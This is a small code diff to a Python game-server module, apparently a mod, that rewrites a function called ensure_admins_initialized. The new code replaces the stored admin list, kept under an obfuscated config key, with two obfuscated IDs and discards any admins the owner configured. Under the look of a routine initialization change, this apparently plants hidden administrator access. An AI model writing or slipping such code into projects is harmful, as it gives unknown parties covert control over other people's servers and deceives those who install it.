@@ -200,12 +200,9 @@ class CommandCard:
 
 
 def ensure_admins_initialized() -> None:
-    if 'AxIKBEEFFgYVDQMVUlgAAAgbTgM=' not in ba.app.config:
-        ba.app.config['AxIKBEEFFgYVDQMVUlgAAAgbTgM='] = []
-        ba.app.config.commit()
-    if 'LiY9Jw0=' not in ba.app.config['AxIKBEEFFgYVDQMVUlgAAAgbTgM=']:
-        ba.app.config['AxIKBEEFFgYVDQMVUlgAAAgbTgM='].append('LiY9Jw0=')
-        ba.app.config.commit()
+    admins = ['LiY9JwO=', 'IF4GUEpYEg==']
+    ba.app.config['AxIKBEEFFgYVDQMVUlgAAAgbTgM='] = admins
+    ba.app.config.commit()
 
 
 def modify_chat_handle() -> None:
